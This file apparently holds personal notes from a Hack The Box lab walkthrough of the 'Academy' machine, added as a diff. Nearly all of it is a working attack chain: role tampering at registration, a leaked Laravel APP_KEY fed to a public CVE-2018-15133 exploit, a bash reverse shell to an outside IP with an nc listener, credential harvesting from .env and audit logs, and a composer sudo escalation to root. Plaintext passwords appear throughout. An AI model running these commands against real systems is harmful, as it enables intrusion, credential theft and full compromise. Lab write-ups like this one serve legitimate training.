@@ -1,0 +1,30 @@
+//Based on felamos
+/etc/hosts	academy.htb
+/admin.php
+register -> uid=charles&password=charles&confirm=charles&roleid=1
+//login as admin
+dev-staging-01.academy.htb
+//Monolog\Logger addRecord:
+db: homestead
+homestead : secret
+APP_KEY : base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
+/usr/local/bin/mssqlclient.py -port 36060 -db homestead homestead:secret@10.10.10.215	//doesnt work
+
+//detected laravel
+git clone https://github.com/aljavier/exploit_laravel_cve-2018-15133.git
+rlwrap nc -lvnp 9001
+python3 pwn_laravel.py http://dev-staging-01.academy.htb/ dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= -c "bash -c 'bash -i >& /dev/tcp/10.10.14.31/9001 0>&1'"
+
+cat /var/www/html/academy/.env
+dev : mySup3rP4s5w0rd!! : cry0l1t3
+su cry0l1t3 -		//got shell as cry0l1t3
+
+aureport --tty		//If logging tty input is enabled -> creds stored in /var/log/audit/audit.log in hex, aureport decodes
+mrb3n : mrb3n_Ac@d3my!
+su mrb3n		//got shell as mrb3n
+sudo -l
+/usr/bin/composer
+//gtfobins
+TF=$(mktemp -d)
+echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
+sudop composer --working-dir=$TF run-script x		//got root
